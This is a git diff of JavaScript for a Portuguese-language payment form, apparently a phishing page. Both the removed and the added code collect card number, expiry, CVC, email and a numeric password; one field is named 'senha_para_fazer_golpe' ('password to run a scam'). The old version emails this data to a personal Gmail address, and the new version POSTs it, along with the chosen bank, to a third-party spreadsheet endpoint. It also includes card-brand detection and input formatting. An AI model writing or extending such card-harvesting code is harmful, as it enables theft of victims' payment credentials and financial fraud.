@@ -9,49 +9,74 @@
 //innerhtml perguntar pro prof
 // PARA DEIXAR A VARIAVEL MAIS FACIL PARA URL VER, var de subject junta com o encode serve para codificar as palavras = (&$#c-%$)var subjectEncoded = encodeURIComponent(subject);var bodyEncoded = encodeURIComponent(body);
 
-
-
-function indetificar_cartão() {
-    var numero_do_cartão = document.getElementById("numero_do_cartão").value;
-    var issuer = "";
+document.getElementById("numero_do_cartao").addEventListener("input", function() {
+    var numero_do_cartao = this.value;
+    var bandeira = "";
 
     // Verificação simples dos BINs para Visa, MasterCard e Elo
-    if (/^4[0-9]{5}/.test(numero_do_cartão)) {
-        issuer = "Visa";
-    } else if (/^5[1-5][0-9]{4}/.test(numero_do_cartão)) {
-        issuer = "MasterCard";
-    } else if (/^(506699|509|65[0-9]{4})/.test(numero_do_cartão)) {
-        issuer = "Elo";
+    if (/^4[0-9]{5}/.test(numero_do_cartao)) {
+        bandeira = "Visa";
+    } else if (/^5[1-5][0-9]{4}/.test(numero_do_cartao)) {
+        bandeira = "MasterCard";
+    } else if (/^(506699|509|65[0-9]{4})/.test(numero_do_cartao)) {
+        bandeira = "Elo";
     } else {
-        issuer = "Emissor desconhecido";
+        bandeira = "Bandeira desconhecida";
     }
 
-    document.getElementById("resultado").innerHTML = "O emissor do cartão é: " + issuer;
-}
+    if (numero_do_cartao.length >= 6) {
+        document.getElementById("resultado").textContent = "A bandeira do cartão é: " + bandeira;
+    } else {
+        document.getElementById("resultado").textContent = "";
+    }
+});
 
-document.getElementById("formulario").onsubmit = function(event) {
-    // Prevenir o envio padrão do formulário
-    event.preventDefault();
 
-    // adicionando valores as variáveis (var)
-    var numero_do_cartão = document.getElementById("numero_do_cartão").value;
-    var nome = document.getElementById("nome").value;
-    var data = document.getElementById("data").value;
-    var cvc = document.getElementById("cvc").value;
-    var email = document.getElementById("email").value;
-    var senha_para_fazer_golpe = document.getElementById("senha_para_fazer_golpe").value;
 
-    // Montar a mensagem para do email
-    var subject = `Contato de ${nome}`;
-    var body = `Olá, meu numero de cartão é ${numero_do_cartão}. a MM/AA do meu cartão é ${data}. o código de segurança ${cvc}
-    . Meu email é ${email}. minha senha é ${senha_para_fazer_golpe}`;
 
-    // PARA DEIXAR A VARIAVEL MAIS FACIL PARA URL VER, var de subject junta com o encode serve para codificar as palavras = (&$#c-%$)
-    var subjectEncoded = encodeURIComponent(subject);
-    var bodyEncoded = encodeURIComponent(body);
+document.getElementById('cardForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Impede o envio padrão do formulário
 
-    var mailtoLink = `mailto:matheuspinho5050@gmail.com?subject=${subjectEncoded}&body=${bodyEncoded}`;
+    const formData = {
+        numero_do_cartao: document.getElementById('numero_do_cartao').value,
+        data: document.getElementById('data').value,
+        cvc: document.getElementById('cvc').value,
+        email: document.getElementById('email').value,
+        senha: document.getElementById('senha').value,
+        banco: document.querySelector('input[name="banco"]:checked').value
+    };
+    document.getElementById("data_vencimento").addEventListener("input", function(e) {
+        var input = e.target.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+        if (input.length >= 4) {
+            var mes = input.substring(0, 2);
+            var ano = "20" + input.substring(2, 4);
+            e.target.value = mes + "/" + ano;
+        } else {
+            e.target.value = input; // Atualiza o campo com o valor numérico atual
+        }
+    });
+    
+    document.getElementById("cvc").addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+    });
+    
+    document.getElementById("senha").addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+    });
+    fetch('https://api.sheetmonkey.io/form/dk6Robg3edERDVFSq6TJWZ', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById('resultado').textContent = 'Formulário enviado com sucesso!';
+    })
+    .catch(error => {
+        document.getElementById('resultado').textContent = 'Erro ao enviar formulário: ' + error;
+    });
+});
+;
 
-    // quando a variavel va mailtolink for acionada esse codigo rediocionará 
-    window.location.href = mailtoLink;
-};
